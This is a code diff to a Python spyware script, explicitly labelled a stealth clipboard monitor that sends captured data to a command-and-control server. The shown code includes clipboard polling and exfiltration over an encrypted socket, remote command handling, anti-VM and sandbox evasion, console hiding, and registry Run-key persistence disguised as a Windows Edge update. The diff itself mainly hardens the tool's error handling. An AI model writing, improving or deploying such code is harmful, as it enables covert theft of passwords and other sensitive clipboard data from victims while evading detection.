@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-"""
+"""Stealth Clipboard Monitor - Captures clipboard data and sends to C2 server"""
+
 import time
 import socket
 import threading
@@ -11,6 +12,7 @@ import argparse
 import logging
 import random
 import ctypes
+import webbrowser
 from datetime import datetime
 from pathlib import Path
 
@@ -18,7 +20,7 @@ from pathlib import Path
 def ensure_dependencies():
     for pkg in ["pyperclip", "cryptography"]:
         try:
-            __import__(pkg.replace("cryptography", "cryptography.fernet"))
+            __import__(pkg)
         except ImportError:
             print(f"[*] Installing {pkg}...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
@@ -92,8 +94,8 @@ class ClipboardMonitor:
                 if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                     self.logger.warning("Another instance is already running. Exiting.")
                     sys.exit(0)
-            except:
-                pass
+            except Exception as e:
+                self.logger.debug(f"Mutex error: {e}")
 
     def is_vm(self):
         """Basic anti-VM / sandbox detection"""
@@ -110,8 +112,8 @@ class ClipboardMonitor:
                 if result.returncode == 0:
                     self.logger.warning("VM/Sandbox detected! Exiting for OPSEC.")
                     return True
-        except:
-            pass
+        except Exception as e:
+            self.logger.debug(f"VM check error: {e}")
         return False
 
     def open_chrome(self):
@@ -162,10 +164,14 @@ class ClipboardMonitor:
                 encrypted = self.encrypt(message)
                 self.socket.send(len(encrypted).to_bytes(4, 'big') + encrypted)
                 return True
-            except:
+            except Exception as e:
                 self.connected = False
+                self.logger.debug(f"Send error: {e}")
                 if self.socket:
-                    self.socket.close()
+                    try:
+                        self.socket.close()
+                    except Exception:
+                        pass
                 return False
 
     def receive_commands(self):
@@ -190,7 +196,8 @@ class ClipboardMonitor:
                         new_int = float(cmd.split()[1])
                         self.config["check_interval"] = new_int
                         self.logger.info(f"Check interval updated to {new_int}s")
-                    except:
+                    except (IndexError, ValueError) as e:
+                        self.logger.debug(f"Invalid interval command: {e}")
                         self.send_message("Invalid interval")
                 elif cmd == "screenshot":
                     self.send_message("[!] Screenshot feature coming in next version")
@@ -200,7 +207,8 @@ class ClipboardMonitor:
                     self.cleanup()
                 elif cmd == "help":
                     self.send_message("Available: ping, interval X, screenshot, uninstall")
-            except:
+            except Exception as e:
+                self.logger.debug(f"Command receive error: {e}")
                 break
 
     def save_locally(self, data: str):
@@ -209,8 +217,8 @@ class ClipboardMonitor:
             backup = Path(self.config["log_dir"]) / f"cache_{datetime.now():%Y%m%d}.log"
             with open(backup, 'a', encoding='utf-8') as f:
                 f.write(f"[{ts}] {data}\n")
-        except:
-            pass
+        except Exception as e:
+            self.logger.debug(f"Save error: {e}")
 
     def heartbeat(self):
         """Periodic heartbeat even when idle"""
@@ -238,8 +246,8 @@ class ClipboardMonitor:
                     self.save_locally(current)
                     self.send_message(f"[{datetime.now():%H:%M:%S}] {current}")
                     self.last_text = current
-            except:
-                pass
+            except Exception as e:
+                self.logger.debug(f"Clipboard read error: {e}")
 
             # Jitter
             sleep_time = self.config["check_interval"] * random.uniform(0.7, 1.3)
@@ -258,8 +266,8 @@ class ClipboardMonitor:
         if self.socket:
             try:
                 self.socket.close()
-            except:
-                pass
+            except Exception as e:
+                self.logger.debug(f"Socket close error: {e}")
         self.logger.info("Monitor stopped")
 
 
@@ -268,7 +276,7 @@ def hide_console():
     if sys.platform == "win32":
         try:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        except:
+        except Exception as e:
             pass
 
 
@@ -278,10 +286,13 @@ def load_or_create_config():
         try:
             with open(config_path) as f:
                 return {**DEFAULT_CONFIG, **json.load(f)}
-        except:
+        except Exception as e:
             pass
-    with open(config_path, "w") as f:
-        json.dump(DEFAULT_CONFIG, f, indent=2)
+    try:
+        with open(config_path, "w") as f:
+            json.dump(DEFAULT_CONFIG, f, indent=2)
+    except Exception as e:
+        pass
     return DEFAULT_CONFIG.copy()
 
 
@@ -291,7 +302,7 @@ def add_persistence():
         key = r"Software\Microsoft\Windows\CurrentVersion\Run"
         subprocess.run(['reg', 'add', f'HKCU\\{key}', '/v', 'WindowsEdgeUpdate', '/t', 'REG_SZ',
                        '/d', f'"{exe_path}"', '/f'], check=True)
-    except:
+    except Exception as e:
         pass
 
 
@@ -337,7 +348,10 @@ def main():
     except KeyboardInterrupt:
         monitor.cleanup()
     except Exception as e:
-        monitor.logger.error(f"Critical error: {e}")
+        try:
+            monitor.logger.error(f"Critical error: {e}")
+        except:
+            print(f"Critical error: {e}")
 
 
 if __name__ == "__main__":
